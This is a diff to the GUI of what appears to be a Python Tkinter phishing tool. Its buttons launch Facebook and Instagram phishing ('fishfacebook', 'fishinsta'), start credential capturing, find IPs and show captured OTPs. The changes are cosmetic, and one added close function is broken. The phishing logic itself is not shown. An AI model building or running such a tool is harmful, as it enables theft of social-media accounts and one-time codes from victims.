@@ -39,9 +39,7 @@ def sites():
 		copybutton = Button(root4,text="copy link", command= linkwindow)
 		copybutton.grid(row=0, column=0)
 		
-		sty = Style()
-		sty.configure('W.TButton', font = ('calibri', 10, 'bold'), foreground = 'blue')
-		listener = Button(root4, text="start capturing", style = "W.TButton", command=capture).grid(row=1,column=0)
+		listener = Button(root4, text="start capturing", command=capture).grid(row=1,column=0)
 	
 		ip = Button(root4,text="ip", command= ipfinder)
 		ip.grid(row=2, column=0)
@@ -131,12 +129,15 @@ def sites():
 		otparea.grid(row=5,column=2)
 		otparea.insert(INSERT, "click OTP to update")
 		root3.mainloop()
+	def destroy():
+		root1.destroy
+		root.destroy
 	root1 = Tk()
 	root1.geometry('500x300')
 	root1.title("coose option")
-	option1 = Button(root1, text = 'Facebook',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = fishfacebook).grid(row = 0, column = 0)
-	option1 = Button(root1, text = 'instagram',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN,command = fishinsta).grid(row = 0, column = 1)
-	toolcloser = Button(root1, text = 'Quit !',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = root1.destroy).grid(row = 0, column = 3)
+	option1 = Button(root1, text = 'Facebook',font=('Times New Roman', 18,'bold'), bg="blue", fg="white", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = fishfacebook).grid(row = 0, column = 0)
+	option1 = Button(root1, text = 'instagram',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN,command = fishinsta).grid(row = 0, column = 1)
+	toolcloser = Button(root1, text = 'Quit !',font=('Times New Roman', 18,'bold'), bg="red", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = root1.destroy).grid(row = 0, column = 3)
 	root1.mainloop()
 os.system("""
 #!/bin/bash
